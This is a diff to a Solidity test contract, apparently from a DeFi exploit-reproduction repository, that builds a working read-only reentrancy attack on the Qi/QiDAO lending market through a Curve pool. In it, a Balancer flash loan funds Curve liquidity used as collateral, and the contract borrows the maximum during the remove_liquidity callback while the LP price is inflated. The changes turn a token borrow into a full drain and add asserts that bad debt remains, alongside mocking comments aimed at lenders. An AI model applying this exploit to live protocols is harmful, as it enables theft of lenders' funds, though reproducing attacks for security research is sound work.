@@ -38,7 +38,8 @@ interface ICERC20Delegator {
     function mint(uint256 mintAmount) external payable returns (uint256);
     function balanceOf(address _of) external view returns(uint256);
     function decimals() external view returns(uint16);
-    function borrow(uint256 borrowAmount) external payable returns (uint256);
+    function borrow(uint256 borrowAmount) external payable returns (uint);
+    function borrowBalanceCurrent(address) external returns (uint256);
     function accrueInterest() external;
     function approve(address spender, uint256 amt) external;
     function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
@@ -46,7 +47,7 @@ interface ICERC20Delegator {
 
 interface ICurvePool {
     function add_liquidity(uint256[2] memory amounts, uint256 min_min_amount, bool use_eth) external payable returns(uint256);
-    function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts , bool use_eth) external payable returns(uint256);
+    function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts , bool use_eth) external payable;
     function token() external pure returns (address);
 }
 
@@ -112,10 +113,11 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         console.log("PRICE at beginnign");
         console.log(priceAtBeginning);
         balancer.flashLoan(address(this), _tokens, _amounts, "");
+        console.log("finished flashloan");
     }
 
     fallback() external payable {
-        _fallback();
+        // _fallback();
     }
 
     receive() external payable {
@@ -130,30 +132,24 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         // to the borrow platform, which should price them a lot more
         // than they are. Once we get our borrow, repay the flashloan
         // and finish
+        priceDuringCallback = get_lp_token_price_for_compound(); //
+        console.log("PRICE at callback");
+        console.log(priceDuringCallback);
 
-        console.log("STARTING BORROW");
-
+        // Borrow as much as we can and then check that
+        // everything went OK with the loan before returning
+        // control to the calling function (removeLiquidity)
         (uint error, uint liquidity, uint shortfall) = UNITROLLER.getAccountLiquidity(address(this));
         require(error == 0, "something happened");
         require(shortfall == 0, "account underwater");
         require(liquidity > 0, "account has excess collateral");
 
-
-        console.log(shortfall);
-        console.log(liquidity);
-
-
-        priceDuringCallback = get_lp_token_price_for_compound(); //
         uint256 maxBorrowUnderlying = liquidity / priceDuringCallback;
+        uint256 code = QIDAO_DELEGATOR.borrow(maxBorrowUnderlying * 10**18);
+        uint256 borrows = QIDAO_DELEGATOR.borrowBalanceCurrent(address(this));
 
-        console.log("PRICE at callback");
-        console.log(priceDuringCallback);
-        console.log(maxBorrowUnderlying);
-
-        console.log(address(BEEFY_DELEGATOR));
-        QIDAO_DELEGATOR.borrow(100);
-
-        console.log("borrow was ok");
+        require(code == 0);
+        require(borrows == maxBorrowUnderlying * 10**18);
     }
 
 
@@ -163,14 +159,11 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         uint256[] memory ,
         bytes memory
     ) external payable {
+        // Sensible requires to aid development
         require(msg.sender == address(balancer), "only callable by balancer");
         require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
         require(address(tokens[0]) == address(WMATIC));
         require(address(tokens[1]) == address(stLIDOMATIC));
-
-        console.log(amounts[0]);
-        console.log(amounts[1]);
-
 
         // Add to the pool all my WMATIC and stLIDOMATIC, I will
         // receive LP tokens in return
@@ -181,8 +174,6 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
                                                  amounts[0]];
         uint256 lp_tokens = CURVE_POOL.add_liquidity(addLiquidityAmounts, 0, false);
 
-        console.log(CURVE_LP_TOKEN.balanceOf(address(this)));
-        console.log(lp_tokens);
         assertGe(CURVE_LP_TOKEN.balanceOf(address(this)), 0);
 
         // Now, our attacker will start a position on Compound
@@ -213,9 +204,16 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         CURVE_POOL.remove_liquidity(lp_tokens_now, minAmounts, true);
 
         priceAfterCallback = get_lp_token_price_for_compound();
-        console.log("PRICE after");
         console.log(priceAfterCallback);
-        // console.log("finished");
+
+        // We now acquired a bad debt... good luck recovering your borrowed
+        // amount though, liquidate all you want ;)
+        (uint error, uint liquidity, uint shortfall) = UNITROLLER.getAccountLiquidity(address(this));
+        require(error == 0, "yikes can't get our account liquidity");
+        require(shortfall > 0, "i owe you and you will never catch me");
+        require(liquidity == 0, "i can't take any more debt but who cares?");
+
+        // We now have to repay the flashloan and be on our way.
 
     }
 
